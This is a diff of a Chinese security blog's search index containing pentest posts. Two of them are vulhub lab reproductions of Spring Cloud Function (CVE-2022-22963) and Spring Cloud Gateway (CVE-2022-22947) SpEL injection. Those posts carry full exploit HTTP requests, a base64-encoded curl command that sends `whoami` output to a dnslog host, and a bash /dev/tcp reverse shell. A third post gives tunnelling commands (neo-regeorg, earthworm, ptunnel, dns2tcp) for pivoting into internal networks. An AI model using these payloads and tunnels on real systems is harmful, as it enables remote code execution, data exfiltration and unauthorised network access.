@@ -8,7 +8,7 @@
       <link href="/2022/05/07/Spring-Cloud-Function/"/>
       <url>/2022/05/07/Spring-Cloud-Function/</url>
       
-        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Function-SpEL表达式命令注入"><a href="#Spring-Cloud-Function-SpEL表达式命令注入" class="headerlink" title="Spring Cloud Function SpEL表达式命令注入"></a>Spring Cloud Function SpEL表达式命令注入</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22963docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开网站<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507145015952.png" alt="image-20220507145015952"></p><p>先用<a href="http://dnslog.cn/">dnslog</a>获取一个dns</p><pre><code>mbehkf.dnslog.cn</code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160404330.png" alt="image-20220507160404330"></p><p>构造命令</p><pre class=" language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.kirjsf.dnslog.cn</code></pre><p>用<a href="https://x.hacking8.com/?post=293">base64编码</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160417478.png" alt="image-20220507160417478"></p><p>构造数据包</p><pre><code>POST /functionRouter HTTP/1.1Host:192.168.96.170:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)Content-Type: text/plainContent-Length: 6test</code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160509318.png" alt="image-20220507160509318"></p><p>发送过去</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160528008.png" alt="image-20220507160528008"></p><p>过来了</p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>base64编码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQo=&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>用nc监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>然后把命令扔进去，发送数据包</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160905195.png" alt="image-20220507160905195"></p><p>过去了</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160932257.png" alt="image-20220507160932257"></p><p>成功反弹shell！</p><p>结束！！</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Function-SpEL表达式命令注入"><a href="#Spring-Cloud-Function-SpEL表达式命令注入" class="headerlink" title="Spring Cloud Function SpEL表达式命令注入"></a>Spring Cloud Function SpEL表达式命令注入</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22963docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开网站<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507145015952.png" alt="image-20220507145015952"></p><p>先用<a href="http://dnslog.cn/">dnslog</a>获取一个dns</p><pre><code>mbehkf.dnslog.cn</code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160404330.png" alt="image-20220507160404330"></p><p>构造命令</p><pre class=" language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.kirjsf.dnslog.cn</code></pre><p>用<a href="https://x.hacking8.com/?post=293">base64编码</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160417478.png" alt="image-20220507160417478"></p><p>构造数据包</p><pre class=" language-bash"><code class="language-bash">POST /functionRouter HTTP/1.1Host:192.168.96.170:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T<span class="token punctuation">(</span>java.lang.Runtime<span class="token punctuation">)</span>.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">"bash -c &amp;#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;"</span><span class="token punctuation">)</span>Content-Type: text/plainContent-Length: 6<span class="token function">test</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160509318.png" alt="image-20220507160509318"></p><p>发送过去</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160528008.png" alt="image-20220507160528008"></p><p>过来了</p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>base64编码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQo=&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>用nc监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>然后把命令扔进去，发送数据包</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160905195.png" alt="image-20220507160905195"></p><p>过去了</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160932257.png" alt="image-20220507160932257"></p><p>成功反弹shell！</p><p>结束！！</p>]]></content>
       
       
       <categories>
@@ -43,7 +43,7 @@
       <link href="/2022/05/07/Spring-Cloud-Gateway/"/>
       <url>/2022/05/07/Spring-Cloud-Gateway/</url>
       
-        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行"><a href="#Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行" class="headerlink" title="Spring Cloud Gateway Actuator API SpEL表达式注入命令执行"></a>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>Spring Cloud Gateway 3.1.x - 3.1.1</p><p>Spring Cloud Gateway 3.0.x - 3.0.7</p><p>旧的、不受支持的版本也会受到影响</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22947docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507140704246.png" alt="image-20220507140704246"></p><p>构造恶意伪造数据包</p><pre><code>POST /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329&#123;  &quot;id&quot;: &quot;hacktest&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141227943.png" alt="image-20220507141227943"></p><p>用刚添加的路由发送如下数据包，此数据包会触发表达式执行</p><pre><code>POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141839633.png" alt="image-20220507141839633"></p><p>构造数据包查看结果</p><pre><code>GET /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 2</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141932420.png" alt="image-20220507141932420"></p><p>结束后删除路由</p><pre><code>DELETE /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142054696.png" alt="image-20220507142054696"></p><p>最后在刷新</p><pre><code>POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142147356.png" alt="image-20220507142147356"></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行"><a href="#Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行" class="headerlink" title="Spring Cloud Gateway Actuator API SpEL表达式注入命令执行"></a>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>Spring Cloud Gateway 3.1.x - 3.1.1</p><p>Spring Cloud Gateway 3.0.x - 3.0.7</p><p>旧的、不受支持的版本也会受到影响</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22947docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507140704246.png" alt="image-20220507140704246"></p><p>构造恶意伪造数据包</p><pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  <span class="token string">"id"</span><span class="token keyword">:</span> <span class="token string">"hacktest"</span>,  <span class="token string">"filters"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"AddResponseHeader"</span>,    <span class="token string">"args"</span><span class="token keyword">:</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>      <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"Result"</span>,      <span class="token string">"value"</span><span class="token keyword">:</span> <span class="token string">"#&amp;#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&amp;#123;\"id\"&amp;#125;).getInputStream()))&amp;#125;"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;],</span>  <span class="token string">"uri"</span><span class="token keyword">:</span> <span class="token string">"http://example.com"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141227943.png" alt="image-20220507141227943"></p><p>用刚添加的路由发送如下数据包，此数据包会触发表达式执行</p><pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141839633.png" alt="image-20220507141839633"></p><p>构造数据包查看结果</p><pre class=" language-bash"><code class="language-bash">GET /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 2</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141932420.png" alt="image-20220507141932420"></p><p>结束后删除路由</p><pre class=" language-bash"><code class="language-bash">DELETE /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: close</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142054696.png" alt="image-20220507142054696"></p><p>最后在刷新</p><pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142147356.png" alt="image-20220507142147356"></p>]]></content>
       
       
       <categories>
@@ -1641,7 +1641,7 @@
       <link href="/2022/03/29/agents-and-tunnels/"/>
       <url>/2022/03/29/agents-and-tunnels/</url>
       
-        <content type="html"><![CDATA[<h1 id="代理和隧道技术"><a href="#代理和隧道技术" class="headerlink" title="代理和隧道技术"></a>代理和隧道技术</h1><h2 id="neo-neoreg代理"><a href="#neo-neoreg代理" class="headerlink" title="neo-neoreg代理"></a>neo-neoreg代理</h2><p>黑客（192.168.3.134）——-（192.168.3.143）server1（172.16.1.105）—-（172.16.1.103）server2</p><p>在server1随便搭建一个网站</p><p>然后在黑客里下载neo-neoreg</p><pre><code>python neoreg.py generate -k mima123</code></pre><p>把制作好的东西扔进server1里的网站目录下</p><p>继续回到黑客主机里</p><pre><code>python neoreg.py -k mima123 -u http://192.168.3.143/tunnel.php</code></pre><p>然后打开浏览器，在代理里面设置代理</p><p><img src="/2022/03/29/agents-and-tunnels/image-20220330095916789.png" alt="image-20220330095916789"></p><h2 id="earthworm代理"><a href="#earthworm代理" class="headerlink" title="earthworm代理"></a>earthworm代理</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>在server1(windows)上放上这个软件</p><pre><code>ew_for_Win.exe -s ssocksd -l 8888</code></pre><p>黑客</p><pre><code>nano /etc/proxychainssocks5 192.168.3.143 8888</code></pre><h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><p>把server2上面的流量转发到中间人这边，再从中间人转到黑客</p><p>server1</p><pre><code>ew -s rcsocks -l 1080 -e 1024</code></pre><p>server2</p><pre><code>ew -s rssocks -d 172.16.1.105 -e 1024</code></pre><p>黑客</p><p>不用改动</p><h2 id="icmp通道"><a href="#icmp通道" class="headerlink" title="icmp通道"></a>icmp通道</h2><p>黑客可以ping目标，但是无法建立tcp连接</p><p>黑客可以和server1，server1可以和server2通信</p><p>server1（linux）</p><pre><code>apt install ptunnelptunnel -x 1234</code></pre><p>黑客</p><pre><code>ptunnel -p 192.168.3.143 -lp 8080 -da 172.16.1.103 -dp  80 -x 1234</code></pre><h2 id="dns隧道"><a href="#dns隧道" class="headerlink" title="dns隧道"></a>dns隧道</h2><p>大部分防火墙以及IPS，IDS不会过滤dns流量</p><p>黑客可以访问中间人，中间人只能和目标dns通信</p><pre><code>dns2tcpd-F 强制后台运行，默认在后台-i 监听ip,默认0,0,0,0-f 配置文件-d debug级别dns2tcpc-c 启用压缩-z 指定使用域名-d 调式级别(1,2,3)-r 访问目标资源-f 配置文件路径-l 本地监听端口-T DNS请求类型,默认TXT</code></pre><p>在vps服务商把udp53号端口打开，使用dns.xxx.com的A记录指向server1的ip</p><p>server1和黑客都要安装</p><pre><code>apt install dns2tcp</code></pre><p>黑客：</p><pre><code>nano /etc/hosts192.168.3.143 dns.xxx.com </code></pre><p>然后在server1里也设置</p><pre><code>192.168.3.143 dns.xxx.comnano /etc/dns2tcpd.conf在文件里改listen=0.0.0.0key=haha123domain=dns.xxx.com启动隧道dns2tcpd -f /etc/dns2tcpd.conf -F -d 3</code></pre><p>然后转到黑客上</p><pre><code>dns2tcpc -r ssh -k haha123 -z dns.xxx.com 192.168.3.143 -l 8888 -c -d 3ssh -p 8888 127.0.0.1  就建立成了</code></pre>]]></content>
+        <content type="html"><![CDATA[<h1 id="代理和隧道技术"><a href="#代理和隧道技术" class="headerlink" title="代理和隧道技术"></a>代理和隧道技术</h1><h2 id="neo-neoreg代理"><a href="#neo-neoreg代理" class="headerlink" title="neo-neoreg代理"></a>neo-neoreg代理</h2><p>黑客（192.168.3.134）——-（192.168.3.143）server1（172.16.1.105）—-（172.16.1.103）server2</p><p>在server1随便搭建一个网站</p><p>然后在黑客里下载neo-neoreg</p><pre class=" language-Linux"><code class="language-Linux">python neoreg.py generate -k mima123</code></pre><p>把制作好的东西扔进server1里的网站目录下</p><p>继续回到黑客主机里</p><pre class=" language-Linux"><code class="language-Linux">python neoreg.py -k mima123 -u http://192.168.3.143/tunnel.php</code></pre><p>然后打开浏览器，在代理里面设置代理</p><p><img src="/2022/03/29/agents-and-tunnels/image-20220330095916789.png" alt="image-20220330095916789"></p><h2 id="earthworm代理"><a href="#earthworm代理" class="headerlink" title="earthworm代理"></a>earthworm代理</h2><h3 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h3><p>在server1(windows)上放上这个软件</p><pre class=" language-Linux"><code class="language-Linux">ew_for_Win.exe -s ssocksd -l 8888</code></pre><p>黑客</p><pre class=" language-Linux"><code class="language-Linux">nano /etc/proxychainssocks5 192.168.3.143 8888</code></pre><h3 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h3><p>把server2上面的流量转发到中间人这边，再从中间人转到黑客</p><p>server1</p><pre class=" language-Linux"><code class="language-Linux">ew -s rcsocks -l 1080 -e 1024</code></pre><p>server2</p><pre class=" language-Linux"><code class="language-Linux">ew -s rssocks -d 172.16.1.105 -e 1024</code></pre><p>黑客</p><p>不用改动</p><h2 id="icmp通道"><a href="#icmp通道" class="headerlink" title="icmp通道"></a>icmp通道</h2><p>黑客可以ping目标，但是无法建立tcp连接</p><p>黑客可以和server1，server1可以和server2通信</p><p>server1（linux）</p><pre><code>apt install ptunnelptunnel -x 1234</code></pre><p>黑客</p><pre><code>ptunnel -p 192.168.3.143 -lp 8080 -da 172.16.1.103 -dp  80 -x 1234</code></pre><h2 id="dns隧道"><a href="#dns隧道" class="headerlink" title="dns隧道"></a>dns隧道</h2><p>大部分防火墙以及IPS，IDS不会过滤dns流量</p><p>黑客可以访问中间人，中间人只能和目标dns通信</p><pre><code>dns2tcpd-F 强制后台运行，默认在后台-i 监听ip,默认0,0,0,0-f 配置文件-d debug级别dns2tcpc-c 启用压缩-z 指定使用域名-d 调式级别(1,2,3)-r 访问目标资源-f 配置文件路径-l 本地监听端口-T DNS请求类型,默认TXT</code></pre><p>在vps服务商把udp53号端口打开，使用dns.xxx.com的A记录指向server1的ip</p><p>server1和黑客都要安装</p><pre><code>apt install dns2tcp</code></pre><p>黑客：</p><pre><code>nano /etc/hosts192.168.3.143 dns.xxx.com </code></pre><p>然后在server1里也设置</p><pre><code>192.168.3.143 dns.xxx.comnano /etc/dns2tcpd.conf在文件里改listen=0.0.0.0key=haha123domain=dns.xxx.com启动隧道dns2tcpd -f /etc/dns2tcpd.conf -F -d 3</code></pre><p>然后转到黑客上</p><pre><code>dns2tcpc -r ssh -k haha123 -z dns.xxx.com 192.168.3.143 -l 8888 -c -d 3ssh -p 8888 127.0.0.1  就建立成了</code></pre>]]></content>
       
       
       <categories>
@@ -1868,13 +1868,13 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> windows </tag>
-            
-            <tag> 渗透 </tag>
+            <tag> 后门 </tag>
             
             <tag> msf </tag>
             
-            <tag> 后门 </tag>
+            <tag> 渗透 </tag>
+            
+            <tag> windows </tag>
             
         </tags>
       
@@ -1930,11 +1930,11 @@
             
             <tag> 网络安全 </tag>
             
+            <tag> 渗透 </tag>
+            
             <tag> windows </tag>
             
             <tag> 防火墙 </tag>
-            
-            <tag> 渗透 </tag>
             
         </tags>
       
@@ -1992,9 +1992,9 @@
       
         <tags>
             
-            <tag> 工具 </tag>
-            
             <tag> msf </tag>
+            
+            <tag> 工具 </tag>
             
             <tag> kali </tag>
             
@@ -2531,11 +2531,11 @@
             
             <tag> 网络安全 </tag>
             
+            <tag> windows </tag>
+            
             <tag> 域 </tag>
             
             <tag> 内网 </tag>
-            
-            <tag> windows </tag>
             
         </tags>
       
@@ -2562,13 +2562,13 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
             
-            <tag> cs </tag>
+            <tag> 内网渗透 </tag>
             
             <tag> msf </tag>
+            
+            <tag> cs </tag>
             
         </tags>
       
@@ -2595,9 +2595,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2626,9 +2626,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2657,9 +2657,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2688,9 +2688,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2719,9 +2719,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2750,9 +2750,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2781,9 +2781,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
@@ -2812,9 +2812,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 内网渗透 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 内网渗透 </tag>
             
             <tag> cs </tag>
             
